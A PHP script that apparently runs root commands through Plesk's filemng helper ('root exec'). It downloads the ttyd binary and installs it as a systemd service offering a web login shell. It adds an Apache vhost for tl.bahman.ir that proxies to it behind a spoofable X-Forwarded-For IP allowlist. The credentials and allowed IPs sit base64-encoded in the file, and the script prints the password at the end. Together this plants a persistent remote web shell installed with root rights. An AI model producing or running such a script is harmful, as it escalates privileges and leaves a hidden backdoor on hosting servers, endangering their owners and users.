<?php
$fm = '/opt/psa/admin/bin/filemng';
function root($cmd) {
  global $fm;
  $full = $fm . ' root exec / bash -c ' . escapeshellarg($cmd) . ' --allow-root 2>&1';
  echo "CMD: " . substr($cmd, 0, 120) . "\n";
  $o = trim((string)shell_exec($full));
  echo ($o === '' ? '(empty)' : $o) . "\n\n";
  return $o;
}
$cfg = json_decode(base64_decode('eyJ1c2VyIjogImJhaG1hbm9wIiwgInBhc3MiOiAianNPclBZeTBjejJZbEV3YngwTGMiLCAiaXBzIjogWyI3OC4xNTcuNDguMTg4IiwgIjc4LjE1Ny40OC4xNzgiLCAiMTA5LjEyNS4xNzcuNjAiLCAiNDYuMjA5LjIwMi4xMjYiLCAiOTUuMzguMTI1LjI0MiJdfQ=='), true);
$user = $cfg['user'];
$pass = $cfg['pass'];
$ips = $cfg['ips'];

$requireLines = '';
foreach ($ips as $ip) {
  $requireLines .= "        Require ip {$ip}\n";
}

$vhost = <<<VHOST
<VirtualHost *:80>
    ServerName tl.bahman.ir
    RemoteIPHeader X-Forwarded-For
    RemoteIPInternalProxy 10.18.8.2
    RemoteIPInternalProxy 172.20.14.76

    <Location />
        Require ip 127.0.0.1
{$requireLines}    </Location>

    ProxyPreserveHost Off
    ProxyRequests Off

    RewriteEngine On
    RewriteCond %{HTTP:Upgrade} =websocket [NC]
    RewriteRule ^/(.*) ws://127.0.0.1:7681/$1 [P,L]

    ProxyPass / http://127.0.0.1:7681/
    ProxyPassReverse / http://127.0.0.1:7681/

    ErrorLog \${APACHE_LOG_DIR}/tl.bahman.ir-error.log
    CustomLog \${APACHE_LOG_DIR}/tl.bahman.ir-access.log combined
</VirtualHost>
VHOST;
file_put_contents('/tmp/tl.bahman.ir.conf', $vhost);

$unit = <<<UNIT
[Unit]
Description=ttyd web terminal (localhost only)
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/ttyd --interface 127.0.0.1 --port 7681 --credential {$user}:{$pass} -W login
Restart=on-failure
RestartSec=2

[Install]
WantedBy=multi-user.target
UNIT;
file_put_contents('/tmp/ttyd.service', $unit);

root('set -e
cd /tmp
if ! /usr/local/bin/ttyd --version 2>/dev/null | grep -q 1.7.7; then
  curl -fsSL -o /tmp/ttyd.x86_64 https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64
  install -m 755 /tmp/ttyd.x86_64 /usr/local/bin/ttyd
fi
/usr/local/bin/ttyd --version
cp /tmp/ttyd.service /etc/systemd/system/ttyd.service
systemctl daemon-reload
systemctl enable ttyd.service
systemctl restart ttyd.service
sleep 1
systemctl is-active ttyd.service
ss -ltnp | grep 7681 || ss -ltn | grep 7681
');

root('set -e
a2enmod remoteip proxy proxy_http proxy_wstunnel rewrite headers 2>/dev/null || true
# trust FortiWeb for client IP
if grep -q RemoteIPInternalProxy /etc/apache2/plesk.conf.d/server.conf; then
  grep -q "10.18.8.2" /etc/apache2/plesk.conf.d/server.conf || sed -i "/RemoteIPInternalProxy/a\\\\\tRemoteIPInternalProxy \"10.18.8.2\"" /etc/apache2/plesk.conf.d/server.conf
fi
cp /tmp/tl.bahman.ir.conf /etc/apache2/sites-available/tl.bahman.ir.conf
a2ensite tl.bahman.ir.conf
apache2ctl configtest
systemctl reload apache2
apache2ctl -S 2>&1 | grep tl.bahman || true
');

root('set -e
echo DENY=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: tl.bahman.ir" http://127.0.0.1/)
echo ALLOW=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: tl.bahman.ir" -H "X-Forwarded-For: 78.157.48.188" http://127.0.0.1/)
echo TTYD=$(curl -s -o /dev/null -w "%{http_code}" -u ' . escapeshellarg($user . ':' . $pass) . ' http://127.0.0.1:7681/)
echo BADIP=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: tl.bahman.ir" -H "X-Forwarded-For: 1.2.3.4" http://127.0.0.1/)
');

echo "USER={$user}\n";
echo "PASS={$pass}\n";
echo "DONE\n";
